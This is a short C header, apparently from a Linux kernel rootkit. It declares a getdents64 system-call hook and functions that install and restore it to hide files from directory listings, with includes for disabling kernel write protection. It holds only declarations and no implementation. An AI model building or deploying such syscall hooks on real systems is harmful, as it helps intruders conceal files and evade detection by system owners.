#ifndef HIDE_FILES_H
#define HIDE_FILES_H

#include <asm/io.h>         // For read_cr0() and write_cr0()
#include <asm/page.h>       // For page-level operations and constants
#include <asm/processor.h>  // For native_write_cr0()
#include <asm/unistd.h>     // for NR_getdents64
#include <linux/dirent.h>   // For linux_dirent64 structure
#include <linux/string.h>   // For string operations like strstr
#include <linux/syscalls.h> // For syscall related definitions
#include <linux/uaccess.h>  // Copy and write to user buffers

#include "../headers.h"

// asmlinkage long getpid_hook(void);
asmlinkage long sys_getdents64_hook(unsigned int fd,
                                    struct linux_dirent64 __user *dirent,
                                    unsigned int count);
int hide_files_getdents64(void);
void restore_files_getdents64(void);

/* HIDE_FILE_H */
#endif